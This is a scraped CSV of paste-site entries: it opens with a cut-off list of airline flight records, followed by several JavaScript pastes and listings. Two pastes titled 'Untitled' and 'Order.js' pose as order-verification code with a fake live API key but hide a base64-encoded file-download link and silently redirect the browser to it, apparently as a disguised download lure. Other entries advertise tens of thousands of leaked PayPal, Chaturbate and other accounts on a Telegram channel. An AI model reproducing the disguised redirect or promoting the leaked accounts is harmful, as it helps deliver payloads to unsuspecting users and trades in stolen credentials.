id,title,username,language,date,content
    Vuelo(""UA"", 169, ""DEN"", 12, 15, ""LAX"", 13, 36, 0),
    Vuelo(""UA"", 476, ""DEN"", 18, 37, ""STL"", 11, 33, 0),
    Vuelo(""UA"", 134, ""SFO"", 6, 50, ""ORD"", 12, 51, 0),
    Vuelo(""UA"", 669, ""ORD"", 9, 45, ""SFO"", 12, 20, 0),
    Vuelo(""UA"", 615, ""DCA"", 13, 0, ""ORD"", 14, 1, 0),
    Vuelo(""UA"", 794, ""DEN"", 10, 31, ""DFW"", 13, 15, 0),
    Vuelo(""UA"", 340, ""ORD"", 7, 55, ""BOS"", 11, 5, 0),
    Vuelo(""UA"", 427, ""DEN"", 15, 25, ""SEA"", 17, 20, 0),
    Vuelo(""UA"", 319, ""DEN"", 9, 30, ""SEA"", 11, 28, 0),
    Vuelo(""UA"", 805, ""LAX"", 10, 30, ""SFO"", 11, 55, 0),
    Vuelo(""UA"", 343, ""DEN"", 11, 49, ""SFO"", 13, 30, 0),
    Vuelo(""UA"", 121, ""ORD"", 12, 46, ""SFO"", 15, 21, 0),
    Vuelo(""UA"", 612, ""ORD"", 12, 20, ""DCA"", 14, 56, 0),
    Vuelo(""UA"", 730, ""DEN"", 12, 31, ""ORD"", 15, 50, 0),
    Vuelo(""UA"", 399, ""ORD"", 7, 53, ""DFW"", 10, 15, 0),
    Vuelo(""UA"", 487, ""ORD"", 19, 15, ""DEN"", 10, 47, 0),
    Vuelo(""UA"", 359, ""ORD"", 9, 52, ""DFW"", 12, 26, 0),
    Vuelo(""UA"", 152, ""LAX"", 12, 0, ""ORD"", 17, 56, 0),
    Vuelo(""UA"", 457, ""ORD"", 17, 30, ""SEA"", 19, 50, 0),
    Vuelo(""UA"", 699, ""BOS"", 14, 25, ""DTW"", 18, 9, 1),
    Vuelo(""UA"", 478, ""SFO"", 12, 43, ""DFW"", 18, 15, 0),
    Vuelo(""UA"", 442, ""ORD"", 6, 35, ""RDU"", 12, 5, 0),
    Vuelo(""UA"", 365, ""BNA"", 16, 20, ""ORD"", 18, 0, 0),
    Vuelo(""UA"", 971, ""ORD"", 9, 47, ""HOU"", 12, 34, 0),
    Vuelo(""UA"", 390, ""ORD"", 16, 44, ""MIA"", 10, 39, 0),
    Vuelo(""UA"", 196, ""STL"", 15, 3, ""ORD"", 16, 15, 0),
    Vuelo(""UA"", 419, ""DEN"", 11, 55, ""PHX"", 13, 44, 0),
    Vuelo(""UA"", 317, ""HOU"", 6, 39, ""DEN"", 11, 0, 0),
    Vuelo(""UA"", 39, ""ORD"", 8, 15, ""LAX"", 10, 32, 0),
    Vuelo(""UA"", 76, ""MSY"", 10, 47, ""ORD"", 13, 1, 0),
    Vuelo(""UA"", 48, ""LAX"", 7, 45, ""PHL"", 15, 39, 0),
    Vuelo(""UA"", 56, ""SEA"", 13, 0, ""BOS"", 13, 0, 1),
    Vuelo(""UA"", 415, ""ATL"", 17, 12, ""ORD"", 18, 14, 0),
    Vuelo(""UA"", 936, ""SFO"", 9, 0, ""LAX"", 10, 20, 0),
    Vuelo(""UA"", 890, ""LAX"", 14, 10, ""BOS"", 12, 29, 0),
    Vuelo(""UA"", 154, ""SEA"", 7, 5, ""ORD"", 12, 45, 0),
    Vuelo(""UA"", 230, ""DEN"", 9, 21, ""MIA"", 18, 4, 1),
    Vuelo(""UA"", 155, ""BOS"", 12, 40, ""SEA"", 17, 51, 1),
    Vuelo(""UA"", 806, ""SFO"", 11, 30, ""LAX"", 12, 46, 0),
    Vuelo(""UA"", 539, ""DEN"", 18, 15, ""LAX"", 19, 37, 0),
    Vuelo(""UA"", 247, ""DEN"", 13, 50, ""SFO"", 15, 16, 0),
    Vuelo(""UA"", 354, ""LAX"", 11, 22, ""BOS"", 11, 18, 1),
    Vuelo(""UA"", 25, ""JFK"", 10, 0, ""SFO"", 13, 27, 0),
    Vuelo(""UA"", 622, ""PHX"", 12, 2, ""DCA"", 10, 8, 1),
    Vuelo(""UA"", 177, ""TPA"", 12, 55, ""SEA"", 17, 51, 1),
    Vuelo(""UA"", 217, ""ORD"", 17, 55, ""MSP"", 19, 17, 0),
    Vuelo(""UA"", 394, ""ORD"", 7, 44, ""MIA"", 11, 42, 0),
    Vuelo(""UA"", 270, ""DEN"", 10, 38, ""PHL"", 15, 56, 0),
    Vuelo(""UA"", 859, ""ORD"", 13, 55, ""MSP"", 15, 19, 0),
    Vuelo(""UA"", 378, ""SFO"", 13, 45, ""MIA"", 12, 9, 0),
    Vuelo(""UA"", 664, ""DEN"", 18, 33, ""DFW"", 11, 24, 0),
    Vuelo(""UA"", 861, ""BOS"", 17, 16, ""SFO"", 12, 22, 1)
  )

"
1MfNtFBw,Untitled,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:39:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61391/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KWmFHutE,PayPal with Balance,kammex,JavaScript,Monday 28th of April 2025 10:36:24 PM CDT,63167 Accounts Posted On https://t.me/leakzbyeminem
2yJWCvbP,Products.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:24:14 PM CDT,
D5TGskfN,Leaked Accounts - Fresh Hits,kammex,JavaScript,Monday 28th of April 2025 10:21:02 PM CDT,20161 Accounts Posted On https://t.me/leakzbyeminem
AyXav4Zi,Order.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:08:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71934/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aweQ40qa,Chaturbate with Tokens,kammex,JavaScript,Monday 28th of April 2025 10:05:41 PM CDT,50977 Accounts Posted On https://t.me/leakzbyeminem
